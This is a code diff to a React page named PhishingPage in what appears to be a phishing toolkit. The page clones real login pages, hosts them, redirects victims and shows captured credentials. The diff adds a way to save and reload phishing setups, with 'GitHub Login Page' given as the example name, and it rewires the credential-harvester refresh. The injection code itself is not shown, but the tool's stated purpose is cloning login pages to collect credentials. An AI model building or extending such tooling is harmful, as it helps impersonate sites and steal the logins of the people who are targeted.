@@ -9,7 +9,7 @@ import { QrCodeGenerator } from '@/components/qr-code-generator';
 import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, Clipboard, Globe, Wand, StopCircle, Share2 } from 'lucide-react';
+import { Loader2, Clipboard, Globe, Wand, StopCircle, Share2, Save, Trash2 } from 'lucide-react';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
 import { useForm } from 'react-hook-form';
@@ -19,6 +19,8 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
+import { Dialog, DialogTrigger, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -29,7 +31,17 @@ const clonerSchema = z.object({
   path: ['urlToClone'],
 });
 
+type PhishingSetup = {
+  id: string;
+  name: string;
+  targetUrl?: string;
+  htmlContent?: string;
+  redirectUrl: string;
+  createdAt: string;
+};
+
 const storageKey = 'netra-captured-credentials';
+const setupsStorageKey = 'netra-phishing-setups';
 
 export default function PhishingPage() {
   const { toast } = useToast();
@@ -40,6 +52,11 @@ export default function PhishingPage() {
   const [hostedUrl, setHostedUrl] = useState<string | null>(null);
   const [isProcessing, setIsProcessing] = useState(false);
   const [isHosting, setIsHosting] = useState(false);
+  
+  const [savedSetups, setSavedSetups] = useState<PhishingSetup[]>([]);
+  const [isSaveModalOpen, setIsSaveModalOpen] = useState(false);
+  const [saveSetupName, setSaveSetupName] = useState('');
+
 
   const form = useForm<z.infer<typeof clonerSchema>>({
     resolver: zodResolver(clonerSchema),
@@ -50,18 +67,20 @@ export default function PhishingPage() {
     },
   });
 
-  const loadCredentialsFromStorage = () => {
+  const loadDataFromStorage = () => {
     try {
         const storedCreds = localStorage.getItem(storageKey);
         setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
+
+        const storedSetups = localStorage.getItem(setupsStorageKey);
+        setSavedSetups(storedSetups ? JSON.parse(storedSetups) : []);
     } catch (error) {
-        console.error('Failed to load credentials from localStorage', error);
-        setCapturedCredentials([]);
+        console.error('Failed to load data from localStorage', error);
     }
   };
 
   useEffect(() => {
-    loadCredentialsFromStorage();
+    loadDataFromStorage();
   }, []);
   
   useEffect(() => {
@@ -219,7 +238,6 @@ export default function PhishingPage() {
     }
   };
 
-
   const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
@@ -254,13 +272,45 @@ export default function PhishingPage() {
     }
   };
   
-  const handleCopyHtml = () => {
-    if (modifiedHtml) {
-      navigator.clipboard.writeText(modifiedHtml);
-      toast({ title: 'Copied!', description: 'Injected HTML copied to clipboard.' });
+  const handleSaveSetup = () => {
+    if (!saveSetupName.trim()) {
+        toast({ variant: 'destructive', title: "Name required", description: "Please enter a name for the setup." });
+        return;
     }
+    const currentValues = form.getValues();
+    const newSetup: PhishingSetup = {
+        id: crypto.randomUUID(),
+        name: saveSetupName,
+        targetUrl: currentValues.urlToClone,
+        htmlContent: currentValues.htmlContent,
+        redirectUrl: currentValues.redirectUrl,
+        createdAt: new Date().toISOString(),
+    };
+    const updatedSetups = [...savedSetups, newSetup];
+    setSavedSetups(updatedSetups);
+    localStorage.setItem(setupsStorageKey, JSON.stringify(updatedSetups));
+    toast({ title: "Setup Saved", description: `"${saveSetupName}" has been saved.`});
+    setIsSaveModalOpen(false);
+    setSaveSetupName('');
   };
 
+  const handleLoadSetup = (setup: PhishingSetup) => {
+    form.reset({
+        urlToClone: setup.targetUrl || '',
+        htmlContent: setup.htmlContent || '',
+        redirectUrl: setup.redirectUrl,
+    });
+    setModifiedHtml(null);
+    setHostedUrl(null);
+    toast({ title: "Setup Loaded", description: `"${setup.name}" has been loaded into the form.`});
+  };
+
+  const handleDeleteSetup = (setupId: string) => {
+    const updatedSetups = savedSetups.filter(s => s.id !== setupId);
+    setSavedSetups(updatedSetups);
+    localStorage.setItem(setupsStorageKey, JSON.stringify(updatedSetups));
+    toast({ title: "Setup Deleted", description: "The saved setup has been removed."});
+  };
 
   return (
     <div className="flex flex-col gap-6">
@@ -335,19 +385,33 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">Generate Link</CardTitle>
+                        <CardTitle className="text-xl">Generate & Save</CardTitle>
                         <div className="w-full flex gap-2">
-                        <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
-                           {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
-                           Generate Local Link
-                        </Button>
-                        <Button type="button" variant="secondary" onClick={handleCopyHtml}>
-                            <Clipboard className="mr-2 h-4 w-4" />
-                            Copy HTML
-                        </Button>
+                            <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
+                                {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
+                                Generate Local Link
+                            </Button>
+                             <Dialog open={isSaveModalOpen} onOpenChange={setIsSaveModalOpen}>
+                                <DialogTrigger asChild>
+                                    <Button type="button" variant="secondary"><Save className="mr-2 h-4 w-4" />Save Setup</Button>
+                                </DialogTrigger>
+                                <DialogContent>
+                                    <DialogHeader>
+                                        <DialogTitle>Save Phishing Setup</DialogTitle>
+                                        <DialogDescription>Enter a name to save this configuration for later use.</DialogDescription>
+                                    </DialogHeader>
+                                    <div className="py-4">
+                                        <Input value={saveSetupName} onChange={(e) => setSaveSetupName(e.target.value)} placeholder="e.g., GitHub Login Page"/>
+                                    </div>
+                                    <DialogFooter>
+                                        <Button variant="outline" onClick={() => setIsSaveModalOpen(false)}>Cancel</Button>
+                                        <Button onClick={handleSaveSetup}>Save</Button>
+                                    </DialogFooter>
+                                </DialogContent>
+                            </Dialog>
                         </div>
                         <Button type="button" onClick={resetState} variant="destructive" className="w-full">
-                        <StopCircle className="mr-2 h-4 w-4" /> Reset
+                            <StopCircle className="mr-2 h-4 w-4" /> Reset Cloner
                         </Button>
                     </CardFooter>
                     )}
@@ -374,13 +438,46 @@ export default function PhishingPage() {
                </CardContent>
              </Card>
            )}
+
+            <Card>
+                <CardHeader>
+                    <CardTitle>Saved Setups</CardTitle>
+                    <CardDescription>Load a previously saved phishing page configuration.</CardDescription>
+                </CardHeader>
+                <CardContent>
+                    <div className="border rounded-md max-h-80 overflow-y-auto">
+                        <Table>
+                            <TableHeader>
+                                <TableRow>
+                                    <TableHead>Name</TableHead>
+                                    <TableHead>Target</TableHead>
+                                    <TableHead className="text-right">Actions</TableHead>
+                                </TableRow>
+                            </TableHeader>
+                            <TableBody>
+                                {savedSetups.length === 0 && <TableRow><TableCell colSpan={3} className="text-center h-24">No saved setups.</TableCell></TableRow>}
+                                {savedSetups.map(setup => (
+                                    <TableRow key={setup.id}>
+                                        <TableCell className="font-semibold">{setup.name}</TableCell>
+                                        <TableCell className="text-muted-foreground truncate max-w-xs">{setup.targetUrl || 'Pasted HTML'}</TableCell>
+                                        <TableCell className="text-right">
+                                            <Button variant="outline" size="sm" onClick={() => handleLoadSetup(setup)} className="mr-2">Load</Button>
+                                            <Button variant="ghost" size="icon" onClick={() => handleDeleteSetup(setup.id)}><Trash2 className="h-4 w-4 text-destructive"/></Button>
+                                        </TableCell>
+                                    </TableRow>
+                                ))}
+                            </TableBody>
+                        </Table>
+                    </div>
+                </CardContent>
+            </Card>
         </div>
         
         <div className="flex flex-col gap-6">
           <CredentialHarvester 
             credentials={capturedCredentials} 
             onClear={handleClearCredentials} 
-            onRefresh={loadCredentialsFromStorage} 
+            onRefresh={loadDataFromStorage} 
           />
         </div>
       </div>
